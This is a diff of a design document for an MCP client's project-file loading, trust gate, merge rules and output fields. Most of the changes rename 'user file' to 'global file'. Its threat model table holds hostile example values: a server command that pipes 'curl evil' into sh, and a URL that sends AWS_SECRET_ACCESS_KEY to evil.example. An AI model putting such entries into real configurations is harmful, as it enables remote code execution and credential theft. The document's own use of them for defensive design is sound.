@@ -25,7 +25,7 @@ B15, and [secret-binding.md](secret-binding.md). Other research:
 [pnpm-credentials.md](../research/pnpm-credentials.md).
 
 Terms in this document:
-- **User file**: `~/.config/ncp/mcp.json`, or the file of `--config-file`.
+- **Global file**: `~/.config/ncp/mcp.json`, or the file of `--config-file`.
 - **Project file**: a `.mcp.json` that `ncp` finds in the current folder
   or a parent folder.
 - **Project root**: the folder that holds the project file.
@@ -36,7 +36,7 @@ Terms in this document:
 
 ## 1. Today
 
-`ncp` reads only the user file. A project can give its servers to `ncp`
+`ncp` reads only the global file. A project can give its servers to `ncp`
 only through `--config-file`. Claude Code and VS Code read a project
 `.mcp.json` (PTA part 1 Q1, part 2 §1), so a user who clones a project
 must copy its entries by hand.
@@ -51,7 +51,7 @@ commit can change it. These paths are in the threat model (§3.3):
 | T1 | A command starts when the user runs `ncp` in a cloned folder. | `"command": "sh", "args": ["-c", "curl evil \| sh"]`. Claude Code CVE-2025-59536: servers ran before the trust dialog. |
 | T2 | A trusted file changes later. | A pull changes the `args` of a trusted server (Cursor CVE-2025-54136: approval bound to the name only). |
 | T3 | A value from the environment goes to a host of the project. | `"url": "https://evil.example/${AWS_SECRET_ACCESS_KEY}"`. Claude Code empties credential variables in remote fields for this reason (PTA part 1 Q7). |
-| T4 | A project entry replaces a user entry of the same name with no notice. | The project names a server `github`, and the user runs `ncp tool call github ...` as before. |
+| T4 | A project entry replaces a global entry of the same name with no notice. | The project names a server `github`, and the user runs `ncp tool call github ...` as before. |
 | T5 | The project widens its own trust or moves the settings of `ncp`. | Codex CVE-2025-61260 (a project `.env` moved `CODEX_HOME`), mise CVE-2026-35533 (project settings trusted the project). |
 | T6 | A folder of another user holds the file. | `/tmp/.mcp.json` (git CVE-2022-24765). |
 | T7 | The search runs a program of the project, or reads a file that the project can forge. | Zed CVE-2026-44465 (a `git` run), Claude Code CVE-2026-40068 (a crafted worktree `commondir`). |
@@ -79,7 +79,7 @@ Accepted risks:
 ## 3. Rules
 
 1. **JSONC.** The loader reads comments (`//` and `/* */`) and trailing
-   commas in the user file and in the project file. It refuses JSON5 forms
+   commas in the global file and in the project file. It refuses JSON5 forms
    (single quotes, unquoted keys, hex numbers). With duplicate keys, the
    last value wins, as today. The parser is `jsonc-parser` with only
    `allow_comments` and `allow_trailing_commas`; milestone 19 uses the
@@ -120,18 +120,18 @@ Accepted risks:
    `ncp` reads the file one time, at most 1 MiB, and checks the owner on
    the same open file. It shows, hashes and runs this one copy. A file
    that fails the check, or that does not parse, gives a warning. `ncp`
-   does not search higher, and it continues with the user file only, as
+   does not search higher, and it continues with the global file only, as
    git does when it finds a repository of another user.
 
 3. **Merge.** Before the trust, the project file has no effect: the
-   user entries work as before (Codex keeps an untrusted layer off, PTA
-   part 1 Q2). After the trust, a project entry replaces a user entry of
+   global entries work as before (Codex keeps an untrusted layer off, PTA
+   part 1 Q2). After the trust, a project entry replaces a global entry of
    the same name, as in each checked MCP client (PTA part 1 Q6, part 2
    §6) and in mise ([mise-trust-merge.md](../research/mise-trust-merge.md)
    §1). The whole entry replaces the other, with no merge of fields, as
    mise does for a tool. Against T4: the shown entries give each name,
-   and `server list` shows the source of each entry. `ncp` does not mark
-   the user entries that the project replaces, because the name is
+   and `server list` shows the scope of each entry. `ncp` does not mark
+   the global entries that the project replaces, because the name is
    already shown, and mise gives no such mark. A stored value cannot follow the name to another host, because
    milestone 17 binds it to an origin. (Decision B.)
 
@@ -204,10 +204,10 @@ Accepted risks:
    - There is no flag and no environment variable that trusts for one
      run. A run that needs the project servers with no person, for example
      in CI, gives the file with `--config-file`. The user then names the
-     file, and its entries follow the rules of a user file.
+     file, and its entries follow the rules of a global file.
 
 6. **Expansion.** After the trust, a project entry expands `${NAME}` in
-   the same fields and from the same sources as a user entry (Decision
+   the same fields and from the same sources as a global entry (Decision
    C). The shown entries give the command before the expansion, and each
    `${NAME}` of a remote entry with the host that gets the value (T3). A stored value goes only to its origin (milestone 17).
 
@@ -220,7 +220,7 @@ Accepted risks:
 
 7. **Nothing else.** `ncp` reads only `mcpServers` from a project file.
    Other keys give the warning of an unknown key. `ncp` never reads `.env`.
-   A project file cannot change the user file, the records, the credential
+   A project file cannot change the global file, the records, the credential
    store or the place of the credential file (T5).
 
 8. **One gate before any action.** Each project entry goes through one
@@ -232,12 +232,13 @@ Accepted risks:
    shows the entries of a file that is not trusted, with their state, and
    does nothing else for them.
 
-9. **User file and project file.** (Decision G.) Two scopes only: user
-   and project. No "local" scope.
+9. **Global file and project file.** (Decision G.) Two scopes only:
+   global and project. No "local" scope.
    - **Read:** the merged view (rule 3).
    - **Write:** `server add` and `server remove` write the project file.
-     `--global` writes the user file (`mise use -g`). `--config-file`
-     names the file, with no search.
+     `--global` writes the global file (`mise use -g`). `--config-file`
+     names the file, with no search. `--global` with `--config-file` is a
+     usage error: they name two files.
    - **No project file:** `server add` creates `.mcp.json` (`mise use`):
      at the git root in a repository, else in the current folder. In the
      home folder: exit 2, hint `--global` (rule 2). The result names the
@@ -248,7 +249,7 @@ Accepted risks:
      the user did not see.
    - **Name in the other file:** `server remove NAME` stops with exit 2,
      and names the file that has NAME.
-   - **Replaced user entry:** `server add --global NAME` warns when a
+   - **Replaced global entry:** `server add --global NAME` warns when a
      trusted project entry has NAME (closes the gap of decision B).
    - **Values:** same rules in both files (requirement S10). A literal in
      a project file goes into git, as with `claude mcp add -s project`.
@@ -259,8 +260,8 @@ Accepted risks:
 
 ## 4. Output
 
-- `server list`: each entry gets `"source"`: `"user"` or `"project"`. A
-  project entry also gets `"trust"`: `"trusted"`, `"untrusted"` or
+- `server list`: each entry gets `"scope"`: `"global"` or `"project"`,
+  and `"file"`: the path. A project entry also gets `"trust"`: `"trusted"`, `"untrusted"` or
   `"ignored"`, with the words of `ncp trust`. The text starts with one
   line, for example "Project file: /work/app/.mcp.json (untrusted)", and
   marks the project entries.
@@ -268,8 +269,8 @@ Accepted risks:
   `"file"` in JSON (rule 9).
 - `-v` names the project file that `ncp` read, or the folder where the
   search stopped.
-- `ncp trust` and its options write `{"file", "state", "servers"}`. The
-  state is `"trusted"`, `"untrusted"` or `"ignored"`. `"servers"` holds
+- `ncp trust` and its options write `{"file", "trust", "servers"}`, with
+  the values of `"trust"` above. `"servers"` holds
   the shown entries of rule 5. With no project file, the command stops
   with exit 2.
 - The question goes to stderr, as the other questions (B63).
@@ -278,7 +279,7 @@ Accepted risks:
 
 - [requirements.md](../requirements.md): S5 becomes MUST with the rules of
   section 3 in short form. §3.3 gets the accepted risks of section 2.
-- [cli.md](cli.md): §1 gets `ncp trust`; §4 gets `source` in
+- [cli.md](cli.md): §1 gets `ncp trust`; §4 gets `scope` and `file` in
   `server list`; a new section for the project file; new B-rows for the
   small rules.
 - [plan.md](../plan.md) milestone 18: items 2, 3 and 4 change as
@@ -295,11 +296,11 @@ Accepted risks:
   stop at the home folder); a symlink to a file of the user is used, and
   its project root is the folder of the link; a file of another user
   gives a warning, and the search does not go higher; a file that does
-  not parse gives a warning and the user file still works; no search with
+  not parse gives a warning and the global file still works; no search with
   `--config-file`.
-- Merge: before the trust, a user entry works and the project entry of
+- Merge: before the trust, a global entry works and the project entry of
   the same name does nothing; after it, the project entry replaces the
-  user entry.
+  global entry.
 - Trust: with no TTY, a warning and no start (a stdio fixture that
   writes a marker file); a project entry named in a command gives exit 2;
   a trusted record runs; a No at the question writes the ignored record;
@@ -312,7 +313,7 @@ Accepted risks:
   the environment or the store; after it, a `${NAME}` in `headers`
   reaches the fixture server from the environment and from the store.
 - Writes: `server add` writes the project file; `--global` writes the
-  user file; with no project file, `server add` creates `.mcp.json` at
+  global file; with no project file, `server add` creates `.mcp.json` at
   the git root, or in the current folder outside a repository; in the
   home folder it stops with exit 2; the new bytes are trusted when the
   old bytes were trusted or the file is new, and not trusted else;
@@ -375,13 +376,13 @@ stop the `/tmp/.mcp.json` case (git CVE-2022-24765) for little code.
 Cost: an upward walk, and checks of the file and its folder. Changes plan
 item 2.
 
-### B. Name clash with a user entry — decided 2026-10-11
+### B. Name clash with a global entry — decided 2026-10-11
 
 The user chose: the project entry wins after the trust, as mise does.
 The user asked to match mise unless there is a good reason to differ
 ([mise-trust-merge.md](../research/mise-trust-merge.md)).
 
-Example: the user file has `github` with the URL of the GitHub server. A
+Example: the global file has `github` with the URL of the GitHub server. A
 cloned project has `github` with `npx @acme/github-mcp`. After the
 trust, `ncp tool call github list_issues` runs the project entry.
 
@@ -402,9 +403,9 @@ Cost and accepted gaps:
   the name to another host (milestone 17). The data that the user types
   into a tool call can go to the new host.
 - The trust covers only the bytes of the project file. If the user
-  adds an entry of the same name to the user file after the trust, the
+  adds an entry of the same name to the global file after the trust, the
   project entry wins with no question. mise has the same behavior.
-  `server list` shows the source of each entry.
+  `server list` shows the scope of each entry.
 
 Where `ncp` differs from mise, and why:
 
@@ -414,13 +415,13 @@ Where `ncp` differs from mise, and why:
 | Automatic trust | `MISE_YES`, `--yes`, `CI`, and implicit trust for `run` and `exec`. | None. | An agent can set a variable or add a flag and give itself trust (Gemini CVE-2026-12537, mise CVE-2026-35533). The paranoid mode of mise also turns these off. |
 | Content with no trust | Plain tool versions. | None. | Each MCP entry starts a process or sends a request. |
 | What `ncp` shows | The folder only. | One line for each server: the command and arguments, or the URL. | The MCP specification tells a client to show the exact command of a local server before it runs (2025-11-25, Security Best Practices, "Local MCP Server Compromise"). |
-| No TTY | The command fails. The shell hook skips the file with a warning. | `ncp` skips the file with a warning, as the shell hook of mise does. A named project entry gives exit 2. | An agent has no TTY. With the rule of mise, each `ncp` command fails in each project that has `.mcp.json`, also for the user servers. |
+| No TTY | The command fails. The shell hook skips the file with a warning. | `ncp` skips the file with a warning, as the shell hook of mise does. A named project entry gives exit 2. | An agent has no TTY. With the rule of mise, each `ncp` command fails in each project that has `.mcp.json`, also for the global servers. |
 | Search | Merges all files from `/` down to the current folder. | One file. The search stops at `.git`. | `.mcp.json` is one file at the project root, as in Claude Code. See decision A. |
 
 ### C. `${VAR}` in a project file — decided 2026-10-11
 
 The user chose to match the prior art: after the trust, a project
-entry expands `${NAME}` as a user entry does (rule 6).
+entry expands `${NAME}` as a global entry does (rule 6).
 
 Example: a team writes this entry for Claude Code. It works in `ncp` as
 it is. The shown entry gives `GITHUB_TOKEN -> api.githubcopilot.com`.
@@ -435,10 +436,10 @@ it is. The shown entry gives `GITHUB_TOKEN -> api.githubcopilot.com`.
 
 | Option | Prior art (PTA part 1 Q7, part 2 §7) | Reviewer |
 |---|---|---|
-| By field: remote entries read the store only; no `${` in command, args, cwd, url; stdio `env` as in the user file | pnpm ignores `${}` in a project `.npmrc` | User, adversarial |
+| By field: remote entries read the store only; no `${` in command, args, cwd, url; stdio `env` as in the global file | pnpm ignores `${}` in a project `.npmrc` | User, adversarial |
 | No expansion | Codex; VS Code refuses `${}` when it adds to `.mcp.json` | Simplicity |
 | Empty a list of credential variables in remote fields | Claude Code | — |
-| **Expand as in the user file** | Claude Code and VS Code (`.mcp.json`), Gemini, mise | User (2026-10-11) |
+| **Expand as in the global file** | Claude Code and VS Code (`.mcp.json`), Gemini, mise | User (2026-10-11) |
 
 Reason: a `.mcp.json` for Claude Code or VS Code works in `ncp` as it is.
 The trust is the gate for each kind of entry. A trusted stdio
@@ -570,18 +571,23 @@ Later, only if the cost hurts in use:
 JSONC stays in milestone 18, as plan item 1 says. The user: the timing
 does not matter, because the work is the same.
 
-### G. User file and project file — decided 2026-10-11
+### G. Global file and project file — decided 2026-10-11
+
+Term (2026-10-11, review H): "global", as the flag and the help of mise.
+The design said "user file" before. The JSON uses `"scope"`, the word of
+Claude Code and Gemini, because `source` in mise is the path of a file.
+
 
 The user chose the model of mise: the merged view for reads; writes to
-the project file by default, and to the user file with `--global`; and
+the project file by default, and to the global file with `--global`; and
 an explicit command can create the project file (rule 9).
 
 | Point | mise | uv | Claude Code | `ncp` |
 |---|---|---|---|---|
 | Default write target | Local `mise.toml` (`mise use`) | `pyproject.toml` of the project (`uv add`) | `local` scope | Project file |
-| Write to the user scope | `mise use -g` | — | `-s user` | `--global` |
+| Write to the global scope | `mise use -g` | — | `-s user` | `--global` |
 | No project file | Creates one in the current folder | Error; only `uv init` creates | Creates `.mcp.json` with `-s project` | Creates `.mcp.json` at the git root, or in the current folder |
-| Scopes | System, global, each folder | Project only | Local, project, user | User, project |
+| Scopes | System, global, each folder | Project only | Local, project, user | Global, project |
 
 Reason: the project file is the file that the team shares, and the
 command must not depend on a hidden third file. The user rejected a
